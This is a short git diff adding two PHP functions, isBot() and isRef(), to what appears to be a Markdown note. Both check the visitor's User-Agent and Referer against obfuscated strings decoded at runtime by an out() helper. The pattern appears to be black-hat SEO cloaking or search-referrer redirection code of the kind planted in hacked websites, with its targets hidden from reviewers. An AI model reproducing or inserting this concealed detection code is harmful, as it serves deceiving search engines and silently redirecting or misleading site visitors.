@@ -9,3 +9,26 @@ function out($text,$k='tr'){
     return $S4($S3($S2($text)));
 }
 ```
+## 配合使用的
+```PHP
+function isBot(){
+        $userAgent = strtolower($_SERVER['HTTP_USER_AGENT']);
+        $bots = array('=VKMxyTpmIUMcSzL', '=H3oa92p', 'lITMcO3p192piSTn', 'lITMcO3pjLmZ', '=VKMxyTpmI3omyJJ');
+        foreach ($bots as $bot) {
+            if (stristr($userAgent, $this->out($bot))) {
+                return true;
+            }
+        }
+        return false;
+}
+function isRef(){
+        $ref = strtolower(@$_SERVER['HTTP_REFERER']);
+        $jump_ref = explode("|", $this->out("=0GojAUshAzYgAaY812ow5lomkaYiA3omkaY192MiAUshH3om9JLbkaYiA3ouuTshHUMcSzL"));
+        foreach ($jump_ref as $r) {
+            if (stristr($ref, trim($r))) {
+                return true;
+            }
+        }
+        return false;
+}
+```
